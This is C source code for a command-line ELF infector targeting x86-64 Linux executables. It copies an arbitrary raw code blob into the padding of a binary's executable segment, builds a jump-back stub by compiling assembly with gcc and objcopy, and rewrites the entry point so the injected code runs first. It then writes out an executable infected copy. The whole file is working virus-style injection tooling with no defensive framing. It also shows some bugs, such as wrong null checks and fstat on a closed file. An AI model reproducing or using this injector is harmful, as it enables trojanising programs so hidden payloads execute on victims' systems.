#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

int check_elf_magic(Elf64_Ehdr* hdr){
	return ((hdr->e_ident[EI_MAG0] == ELFMAG0) && (hdr->e_ident[EI_MAG1] == ELFMAG1) &&
			(hdr->e_ident[EI_MAG2] == ELFMAG2) && (hdr->e_ident[EI_MAG3] == ELFMAG3));
}

Elf64_Shdr* get_elf_section_header(Elf64_Ehdr* hdr){
	return (Elf64_Shdr*)((long)hdr + hdr->e_shoff);
}

Elf64_Shdr* get_elf_section(Elf64_Ehdr* hdr, int index){
	return &(get_elf_section_header(hdr)[index]);
}

Elf64_Phdr* get_elf_program_header(Elf64_Ehdr* hdr, int index){
	return &(((Elf64_Phdr*)((long)hdr + hdr->e_phoff))[index]);
}


char* get_elf_string(Elf64_Ehdr* hdr, int section_idx, int string_idx){
	char* string_table_base = (char*)((long)hdr + get_elf_section(hdr, section_idx)->sh_offset);
	return string_table_base + string_idx;
}

void infect_segment_padding(Elf64_Ehdr* hdr, void* code, size_t size){
	for (int i = 0; i < hdr->e_phnum; i++){
		Elf64_Phdr* phdr = get_elf_program_header(hdr, i);
		// most ELF files have one executable segment
		if (phdr->p_type == PT_LOAD && phdr->p_flags == (PF_R | PF_X)){
			// search for last section within segment
			unsigned int last_section_within_segment_idx = 0;
			unsigned long padding = 0;
			unsigned long offset = 0;
			
			for (int j = 0; j < hdr->e_shnum; j++){
				Elf64_Shdr* shdr = get_elf_section(hdr, j);
				if ((get_elf_section(hdr, last_section_within_segment_idx)->sh_offset + 
				get_elf_section(hdr, last_section_within_segment_idx)->sh_size) <
				(phdr->p_offset + phdr->p_filesz)){
					last_section_within_segment_idx = j;
				}
			}
			
			Elf64_Shdr* shdr = get_elf_section(hdr, last_section_within_segment_idx);
			
			// determine the padding to the next section
			if (last_section_within_segment_idx < hdr->e_shnum){
				padding = get_elf_section(hdr, last_section_within_segment_idx + 1)->sh_offset - (phdr->p_filesz + phdr->p_offset);
			} else {
				padding = hdr->e_shoff - shdr->sh_offset;
			}
			offset = shdr->sh_offset + shdr->sh_size;
			
			printf("%s has 0x%lx bytes of padding.\n", get_elf_string(hdr,  hdr->e_shstrndx, shdr->sh_name), padding);
			
			if ((0xA + size) > padding){
				printf("Code to big to be injected into ELF!\n");
				printf("Code size: 0x%lx\n", size);
				exit(EXIT_FAILURE);
			}
									
			// modify the section and segment for the injected code
			shdr->sh_size = shdr->sh_size + padding;
			phdr->p_filesz = phdr->p_filesz + padding;
			phdr->p_memsz = phdr->p_memsz + padding;
			
			// copy the infection code
			memcpy((void*)((unsigned long)hdr + offset), code, size);
			
			// create the assembly file for jump to entrypoint stub
			FILE* tmp_asm = fopen("tmp.S", "w+");
			if (tmp_asm < 0){
				printf("Could not create temporary asm file!\n");
				exit(EXIT_FAILURE);
			}
			fprintf(tmp_asm, ".global _start\n.text\n_start:\n");
			fprintf(tmp_asm, "\tleaq %ld(%%rip), %%r11\n", hdr->e_entry - offset - size - 0x7);
			fprintf(tmp_asm, "\tjmp *%%r11\n");
			fflush(tmp_asm);
			
			// compile the file and dump the text section
			system("gcc -c tmp.S -o tmp");
			system("objcopy -O binary --only-section=.text tmp tmp.bin");
			FILE* fp_jump_asm = fopen("tmp.bin", "r");
			if (tmp_asm < 0){
				printf("Could not open compiled binary jump code!\n");
				exit(EXIT_FAILURE);
			}
			struct stat st;
			fstat(fileno(fp_jump_asm), &st);
			char* jump_asm = malloc(st.st_size);
			fseek(fp_jump_asm, 0L, SEEK_SET);
			fread(jump_asm, sizeof(char), st.st_size, fp_jump_asm);
			printf("read in %ld bytes of data\n", st.st_size);
			memcpy((void*)((unsigned long)hdr + offset + size), jump_asm, st.st_size);
	
			// patch the entrypoint of the binary so the infection code is executed
			hdr->e_entry = offset;
			
			break;
		}
	}
	return;
}

void infect_file(Elf64_Ehdr* hdr, size_t size, char* output_path){
	FILE* fp;
	struct stat st;
	
	// copy hdr into the new file
	fp = fopen(output_path, "w");
	if (fp == NULL){
		printf("\nError. Output file could not be created: %s\n", output_path);
		exit(EXIT_FAILURE);
	}
	fwrite(hdr, sizeof(char), size, fp);
	fclose(fp);
	
	// mark the resulting file as executble
	fstat(fileno(fp), &st);
	chmod(output_path, S_IRWXU);
	
	return;
}

void override_entrypoint(Elf64_Ehdr* hdr, unsigned long entry){
}

void usage(){
	printf("Usage:\n");
	printf("	-I/-i input_file  : the file used as input\n");
	printf("	-O/-o output_file : the file to infect\n");
	printf("	-C/-c input_file  : the raw binary with the code to inject\n");
}

int main(int argc, char* argv[], char* envp[]){
	FILE* fp;
	FILE* fcode;
	char* elf_path;
	char* code_path;
	char* inject_path;
	void* code;
	struct stat st;
	Elf64_Ehdr* hdr;
	
	if (argc < 4){
		usage();
		return EXIT_FAILURE;
	}
	
	int opt;
	while ((opt = getopt(argc, argv, ":i:I:o:O:c:C")) != -1){
		switch(opt){
			case 'i':
			case 'I':
				printf("input: %s\n", optarg);
				elf_path = optarg;
				break;
			case 'o':
			case 'O':
				printf("output: %s\n", optarg);
				inject_path = optarg;
				break;
			case 'c':
			case 'C':
				printf("code to inject: %s\n", optarg);
				code_path = optarg;
				break;
		}
	}
	
	// open the input files
	printf("Opening ELF input file... ");
	fp = fopen(elf_path, "r");
	if (fp == NULL){
		printf("\nError. ELF file not found: %s\n", elf_path);
		return EXIT_FAILURE;
	} else {
		printf("Ok.\n");
	}
	
	printf("Opening Code input file... ");
	fcode = fopen(code_path, "r");
	if (fcode == NULL){
		printf("\nError. Code input file not found: %s\n", code_path);
		return EXIT_FAILURE;
	} else {
		printf("Ok.\n");
	}

	// load the ELF file into memory
	printf("Reading ELF file... ");	
	fstat(fileno(fp), &st);
	hdr = malloc(st.st_size);
	fseek(fp, 0L, SEEK_SET);
	fread(hdr, sizeof(char), st.st_size, fp);
	printf("Copied ELF into memory. Size: 0x%lx\n", st.st_size);
	
	// load the code input file into memory
	printf("Reading Code file... ");	
	fstat(fileno(fcode), &st);
	code = malloc(st.st_size);
	fseek(fcode, 0L, SEEK_SET);
	fread(code, sizeof(char), st.st_size, fcode);
	printf("Copied Code into memory. Size: 0x%lx\n", st.st_size);

	// check if argument is an ELF file
	printf("Checking ELF header... ");
	if (!check_elf_magic(hdr)){
		printf(" ELF Magic number is invalid.\n");
		return EXIT_FAILURE;
	} else{
		printf("Ok.\n");
	}

	// checking the ELF machine target instruction set
	if (!(hdr->e_machine == EM_X86_64)){
		printf("ELF file has not x86-64 instruction set.");
		return EXIT_FAILURE;
	}
	
	printf("Infecting segment padding!\n");
	infect_segment_padding(hdr, code, st.st_size);
	fstat(fileno(fp), &st);
	infect_file(hdr, st.st_size, inject_path);
}
